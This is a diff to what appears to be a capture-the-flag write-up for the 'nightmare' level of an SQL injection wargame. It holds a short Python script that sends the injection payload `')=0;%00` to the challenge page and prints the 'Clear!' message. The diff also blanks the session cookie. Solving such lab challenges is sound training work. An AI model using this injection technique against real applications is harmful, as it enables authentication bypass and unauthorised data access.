@@ -8,15 +8,17 @@ url : https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php
 ```python
 import requests
 
-header = {"Cookie": "PHPSESSID=lldbmoaqjlmg994kn38cc31dlc;"}
+header = {"Cookie": "PHPSESSID=;"}
 url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"
 
 payload = "?pw=')=0;%00"
 
-res = requests.get(url + payload, headers=header)
+response = requests.get(url + payload, headers=header)
 
-if "Clear!" in res.text:
-    print("Clear!")
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    print(end+"Clear!")
 ```
 
 Vamos~
